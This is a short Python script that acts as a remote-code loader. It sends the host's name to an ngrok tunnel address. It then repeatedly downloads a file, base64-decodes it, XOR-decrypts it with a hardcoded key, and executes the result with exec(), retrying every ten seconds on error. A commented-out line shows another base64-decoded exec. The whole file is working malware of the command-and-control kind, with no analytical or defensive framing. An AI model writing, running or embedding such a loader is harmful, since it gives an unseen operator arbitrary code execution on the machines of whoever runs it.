from urllib.request import Request, urlopen
import socket, time, base64
name = socket.gethostname().encode("utf-8")
url = "https://scarce-sullen-brilliant.ngrok-free.dev" 
req = Request(url, data=name) 
req.add_header("Content-Type", "text/plain")
req.add_header("ngrok-skip-browser-warning", "1")
while True:
    try:
        urlopen(req)
        with urlopen(url+"/bin.txt", timeout=5) as response:
            file_content = response.read().decode('utf-8')
            ct = base64.b64decode(file_content)
            key = b'password123'
            x = bytearray(b ^ key[i % len(key)] for i, b in enumerate(ct))
            exec(x.decode('utf-8'))
    except Exception as e:
        print(f"Ошибка при отправке: {e}")
        time.sleep(10)

  # exec(compile(base64.b64decode('').decode('utf-8'),'<string>', 'exec'))
